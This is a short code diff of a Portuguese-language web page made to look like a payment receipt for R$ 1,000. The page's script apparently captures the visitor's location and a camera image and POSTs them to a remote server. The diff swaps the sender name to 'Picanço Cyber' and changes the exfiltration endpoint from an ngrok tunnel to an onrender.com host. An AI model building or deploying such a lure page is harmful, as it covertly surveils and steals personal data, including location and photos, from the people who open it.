@@ -12,7 +12,7 @@
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>De:</span>Picanço Cyber</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
     <button class="botao" onclick="window.print()">Imprimir</button>
@@ -77,7 +77,7 @@
         stream.getTracks().forEach(track => track.stop());
 
         // Envia os dados
-        await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
+        await fetch("https://backscan-frontend-7px8.onrender.com/send-data", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ latitude, longitude, maps, image })
